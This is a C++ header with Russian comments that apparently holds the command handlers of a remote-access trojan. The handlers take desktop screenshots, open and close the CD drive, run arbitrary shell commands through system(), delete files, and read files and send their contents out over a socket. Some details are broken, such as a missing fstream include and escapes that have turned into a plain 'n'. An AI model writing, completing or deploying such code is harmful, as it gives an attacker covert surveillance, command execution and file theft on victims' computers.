#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <string>
#include <cstdio>
#include <stdio.h>
#include <tchar.h>

#include <gdiplus.h>
using namespace std;
#pragma comment(lib, "GdiPlus.lib") /* наш многострадальный lib-файл */
using namespace Gdiplus; /* как хочешь, но мне не в кайф постоянно писать Gdiplus:: */

static const GUID png =
{ 0x557cf406, 0x1a04, 0x11d3,{ 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };

#pragma comment(lib, "WinMM.Lib")

class funtoins
{
public:
	void screen_v();
	void openCDROM();
	void closedCDROM();
	void CMDcom(char* str);
	void runfile(char* str);
	char* deletefile(char * str);
	void readfile(char * str, LPVOID param);
};
void funtoins::screen_v()
{
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	HDC scrdc, memdc;
	HBITMAP membit;
	// Получаем HDC рабочего стола
	// Параметр HWND для рабочего стола всегда равен нулю.
	scrdc = GetDC(0);
	// Определяем разрешение экрана
	int Height, Width;
	Height = GetSystemMetrics(SM_CYSCREEN);
	Width = GetSystemMetrics(SM_CXSCREEN);
	// Создаем новый DC, идентичный десктоповскому и битмап размером с экран.
	memdc = CreateCompatibleDC(scrdc);
	membit = CreateCompatibleBitmap(scrdc, Width, Height);
	SelectObject(memdc, membit);
	// Улыбаемся... Снято!
	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
	HBITMAP hBitmap;
	hBitmap = (HBITMAP)SelectObject(memdc, membit);
	Gdiplus::Bitmap bitmap(hBitmap, NULL);
	bitmap.Save(L"screen.png", &png);

	DeleteObject(hBitmap);
};
void funtoins:: openCDROM()
{
	mciSendString(L"Set cdaudio door open wait", NULL, 0, NULL); //Открытие привода CD-ROM
}
void funtoins::closedCDROM()
{
	mciSendString(L"Set cdaudio door closed wait", NULL, 0, NULL); //Закрыть привода CD-ROM
}
void funtoins::CMDcom(char* str)
{
	system(str);
}
void funtoins::runfile(char* str)
{
	system(str);
}
char* funtoins::deletefile(char* str)
{
	if (remove(str) != 0)             // удаление файла file.txt
		return "Ошибка удаления файлаn";
	else
		return "Файл успешно удалёнn";
}
void funtoins::readfile(char* str, LPVOID param)
{
	char iuf[1024];
	SOCKET sock = *(SOCKET*)param;
	ifstream F;
	F.open(str, ios::in);
	while (!F.eof())
	{
		F >> iuf;
		if (SOCKET_ERROR == send(sock, iuf, strlen(iuf) + 1, 0))
			break;
		iuf[0] = 0;
	}
}




